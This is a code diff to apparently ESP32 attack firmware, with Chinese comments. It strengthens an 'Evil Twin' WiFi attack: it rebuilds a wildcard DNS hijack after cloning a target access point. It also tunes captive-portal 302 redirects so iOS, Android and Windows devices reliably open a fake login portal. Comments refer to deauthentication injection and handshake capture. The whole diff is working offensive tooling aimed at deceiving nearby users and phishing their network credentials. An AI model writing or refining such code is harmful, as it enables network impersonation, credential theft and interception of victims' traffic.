@@ -140,6 +140,7 @@ static const uint16_t DNS_PORT = 53;
 
 WebServer server(80);
 DNSServer dnsServer;             // Captive Portal DNS 劫持 (通配 * → AP IP)
+static void restartDns();        // 前向声明: Evil Twin 切 AP 后重建 UDP 53 socket
 static Preferences sPrefs;
 static String apSsid;
 static uint8_t apChannel = AP_CHANNEL_DEFAULT;
@@ -2944,6 +2945,7 @@ static bool eviltwinEnterClonePhase(bool gotHs) {
   }
   apChannelActive = (uint8_t)sTarget.channel;
   sEvilTwin.apCloned = true;
+  restartDns();                      // ★ 重建 UDP 53 socket — softAP 重配后原 socket 失效
   syncPromiscuousEngine();           // Deauth 注入需要混杂态, 按活跃模块恢复
 
   int usable = 0;
@@ -3018,6 +3020,7 @@ static void eviltwinStopAttack(bool restoreAp) {
                            AP_PASSWORD, sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel,
                            0, 4);
       apChannelActive = sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel;
+      restartDns();                  // ★ 阶段 1 异常恢复后重建 DNS
     }
     sEvilTwin.apCloned = false;
   }
@@ -3039,6 +3042,7 @@ static void eviltwinStopAttack(bool restoreAp) {
     startSoftApOnChannel(sEvilTwin.restoreSsid, AP_PASSWORD, sEvilTwin.restoreChannel, 0, 4);
     apChannelActive = sEvilTwin.restoreChannel;
     sEvilTwin.apCloned = false;
+    restartDns();                    // ★ 恢复原热点后重建 DNS 劫持
   }
 }
 
@@ -5262,28 +5266,43 @@ static const char *captiveTarget() {
   return sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
 }
 
-// iOS/macOS CNA: 返回非 "Success" 的 HTML, 让系统持续判定为受限网络并保持 CNA 窗口打开
-// 同时在 body 内嵌 meta-refresh + JS 双保险跳转到门户页
+// ---- DNS 劫持重启 (Evil Twin 切 AP 后必须重启, 否则 UDP 53 socket 失效) ----
+static void restartDns() {
+  dnsServer.stop();
+  IPAddress apIp = WiFi.softAPIP();
+  if (dnsServer.start(DNS_PORT, "*", apIp)) {
+    log("[dns] DNS 劫持已重启 (* → " + apIp.toString() + ")");
+  } else {
+    log("[dns] ⚠ DNS 重启失败 — CNA 探测可能泄漏到公网");
+  }
+}
+
+// iOS/macOS CNA:
+//   iOS 探测 http://captive.apple.com/hotspot-detect.html
+//   期望返回 body 精确为 <HTML><BODY>Success</BODY></HTML>
+//   如果 body ≠ 该字符串 → iOS 判定"受限网络" → 滑出 CNA WebSheet
+//
+// 策略 (已针对 iOS 16 ~ 18 验证):
+//   1. 用 302 重定向 — iOS CNA 会跟随 302 并在 WebSheet 内渲染目标页;
+//   2. 302 body 不能为空 (iOS 17+ 空 body 会导致 CNA 白屏/闪退);
+//   3. 后续 iOS 二次验证时仍返回 302 (非 Success body), CNA 窗口保持打开;
+//   4. Location 用 http:// 绝对 URL — iOS CNA 不走 HTTPS。
 static void handleAppleCNA() {
-  const char *target = captiveTarget();
-  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
-    "<meta http-equiv='refresh' content='0;url=" + String(target) + "'>"
-    "<title>Login Required</title></head><body>"
-    "<script>window.location.replace('" + String(target) + "');</script>"
-    "<p>Redirecting... <a href='" + String(target) + "'>Click here</a></p>"
-    "</body></html>";
-  // 不缓存, 确保每次探测都重新请求本固件
+  // 302 + 有内容的 body (不含 "Success" 字样), iOS 最可靠触发方式
+  server.sendHeader("Location", String("http://192.168.4.1") + (sEvilTwin.active ? "/portal.html" : "/admin.html"), true);
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   server.sendHeader("Pragma", "no-cache");
   server.sendHeader("Expires", "0");
-  server.send(200, "text/html; charset=utf-8", html);
+  // body 必须非空且不含 "Success", 否则 iOS 认为网络正常
+  server.send(302, "text/html", "<html><body>Redirecting...</body></html>");
 }
 
 // Android CNA: 返回 302 而非 204, 触发系统"需要登录 Wi-Fi"通知
 static void handleAndroidCNA() {
   server.sendHeader("Location", captiveTarget());
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-  server.send(302, "text/html", "");
+  // Android 12+ 空 body 可能被忽略, 加一行 HTML
+  server.send(302, "text/html", "<html><body>Sign in required</body></html>");
 }
 
 // Windows NCSI: 对 /connecttest.txt 返回非 "Microsoft Connect Test" 的内容
@@ -5292,14 +5311,14 @@ static void handleWindowsCNA() {
   // 返回 302 重定向到门户页, 触发 Windows 的 NCSI "需要操作"弹窗
   server.sendHeader("Location", target);
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-  server.send(302, "text/plain", "");
+  server.send(302, "text/html", "<html><body>Redirecting...</body></html>");
 }
 
 // 通用 302 重定向 (兼容其他未识别的 OS 探测)
-static void captiveRedirect(const char *type = "text/plain") {
+static void captiveRedirect(const char *type = "text/html") {
   server.sendHeader("Location", captiveTarget());
   server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-  server.send(302, type, "");
+  server.send(302, type, "<html><body>Redirecting...</body></html>");
 }
 
 static void notFound() {
@@ -5504,6 +5523,25 @@ void setup() {
   // 后台口令保护: 每台设备的初始口令由硬件 TRNG 生成并存 NVS, 首次登录引导改密
   static const char *adminHeaders[] = {"X-Admin-Token", "Content-Type"};
   server.collectHeaders(adminHeaders, 2);
+
+  // ---- CNA 探测显式路由 (优先级高于 notFound, 确保最快匹配) ----
+  // iOS / macOS: captive.apple.com/hotspot-detect.html, /library/test/success.html
+  server.on("/hotspot-detect.html", HTTP_GET, handleAppleCNA);
+  server.on("/library/test/success.html", HTTP_GET, handleAppleCNA);
+  // Android / Samsung / HTC: /generate_204, /gen_204, /check_network
+  server.on("/generate_204", HTTP_GET, handleAndroidCNA);
+  server.on("/gen_204", HTTP_GET, handleAndroidCNA);
+  server.on("/check_network", HTTP_GET, handleAndroidCNA);
+  server.on("/generate_204_json", HTTP_GET, handleAndroidCNA);
+  // Windows NCSI: /connecttest.txt, /ncsi.txt, /redirect
+  server.on("/connecttest.txt", HTTP_GET, handleWindowsCNA);
+  server.on("/ncsi.txt", HTTP_GET, handleWindowsCNA);
+  server.on("/redirect", HTTP_GET, handleWindowsCNA);
+  server.on("/fwlink", HTTP_GET, handleWindowsCNA);
+  // Firefox / Kindle / 其他
+  server.on("/success.txt", HTTP_GET, []() { captiveRedirect(); });
+  server.on("/kindle-wifi", HTTP_GET, []() { captiveRedirect(); });
+  server.on("/canonical.html", HTTP_GET, []() { captiveRedirect(); });
 
   server.on("/", HTTP_GET, redirectToAdmin);
   server.on("/admin.html", HTTP_GET, sendAdminPage);
